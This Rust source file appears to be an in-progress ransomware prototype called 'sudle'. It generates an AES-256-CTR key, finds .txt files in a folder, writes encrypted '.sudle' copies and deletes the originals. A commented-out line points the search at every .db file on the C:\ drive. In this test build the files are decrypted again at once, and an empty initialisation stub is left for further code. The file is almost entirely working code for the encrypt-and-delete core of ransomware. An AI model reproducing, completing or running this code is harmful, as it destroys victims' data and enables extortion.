use aes::Aes256;
use cipher::{KeyIvInit, StreamCipher};
use ctr::Ctr128BE;
use dirs;
use rand::{thread_rng, Rng};
use std::{
    fs::{self, File},
    io::{self, Read, Write},
};
use walkdir::WalkDir;

// Type alias for AES-256 in CTR mode
type Aes256Ctr = Ctr128BE<Aes256>;

fn main() {
    initiailize_process();
    let key: [u8; 32] = generate_random_key();
    //let paths = search_db_files("C:\\");
    let home = dirs::home_dir().unwrap();
    let full = format!("{home}/projects/sudle/test_files", home = home.display());
    let paths = search_txt_files(&full);
    for file_path in paths {
        let output_file_path = format!("{}.sudle", file_path);
        match encrypt_delete(&file_path, &output_file_path, &key) {
            Ok(path) => {
                match decrypt_delete(path.as_str(), file_path.as_str(), &key){
                    Ok(file_path) => println!("{} processed successfully", file_path),
                    Err(e) => println!("Error processing {}: {:?}", file_path, e),
                }
            }
            Err(e) => println!("Error processing {}: {:?}", file_path, e),
        }
    }
}

fn initiailize_process() {
    // Add your code here
}

fn generate_random_key() -> [u8; 32] {
    let mut key = [0u8; 32];
    thread_rng().fill(&mut key);
    key
}
fn search_db_files(start_path: &str) -> Vec<String> {
    let mut paths = vec![];
    for entry in WalkDir::new(start_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().map_or(false, |ext| ext == "db"))
    {
        if let Some(path) = entry.path().to_str() {
            paths.push(path.to_string());
        }
    }
    paths
}

fn search_txt_files(start_path: &str) -> Vec<String> {
    let mut paths = vec![];
    for entry in WalkDir::new(start_path)
        .max_depth(1)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().map_or(false, |ext| ext == "txt"))
    {
        paths.push(entry.path().to_str().unwrap().to_string());
    }
    paths
}

fn encrypt_delete(
    input_file_path: &str,
    output_file_path: &str,
    key: &[u8; 32],
) -> Result<String, String> {
    // Open the input file and read its contents
    let mut input_file = File::open(input_file_path).expect("could not open file");
    let mut contents = Vec::new();
    input_file.read_to_end(&mut contents).expect("could not read file");

    // Generate a random nonce for CTR mode
    let mut nonce = [0u8; 16];
    thread_rng().fill(&mut nonce);

    // Create the cipher instance
    let cipher = Aes256Ctr::new_from_slices(key, &nonce).unwrap();

    // Encrypt the contents in place
    let mut buffer = contents.clone();
    cipher.clone().apply_keystream(&mut buffer);

    // Open the output file and write the nonce followed by the encrypted contents
    let mut output_file = File::create(output_file_path).expect("could not create file");
    output_file.write_all(&nonce).expect("could not write nonce");
    output_file.write_all(&buffer).expect("could not write encrypted file");
    match fs::remove_file(input_file_path){
        Ok(_) => Ok(output_file_path.to_string()),
        Err(_) => Err("could not delete file".to_string()),
    }
}

fn decrypt_delete(
    input_file_path: &str,
    output_file_path: &str,
    key: &[u8; 32],
) -> Result<String, String> {
    // Open the input file and read its contents
    let mut input_file = File::open(input_file_path).expect("could not open file");
    let mut contents = Vec::new();
    input_file.read_to_end(&mut contents).expect("could not read file");

    let output_file_path = remove_suffix(input_file_path, ".sudle");
    // Extract the nonce and the encrypted contents
    let (nonce, encrypted) = contents.split_at(16);

    // Create the cipher instance
    let cipher = Aes256Ctr::new_from_slices(key, nonce).unwrap();

    // Decrypt the contents in place
    let mut buffer = encrypted.to_vec();
    cipher.clone().apply_keystream(&mut buffer);

    // Open the output file and write the decrypted contents
    let mut output_file = File::create(output_file_path.clone()).expect("could not create file");
    output_file.write_all(&buffer).expect("could not encrypt file");
    match fs::remove_file(input_file_path){
        Ok(_) => Ok(output_file_path.to_string()),
        Err(_) => Err("could not delete file".to_string()),
    }
}
fn remove_suffix(input: &str, suffix: &str) -> String {
    if input.ends_with(suffix) {
        // Trim the suffix from the input string
        input[..input.len() - suffix.len()].to_string()
    } else {
        // If the input doesn't end with the suffix, return the original input
        input.to_string()
    }
}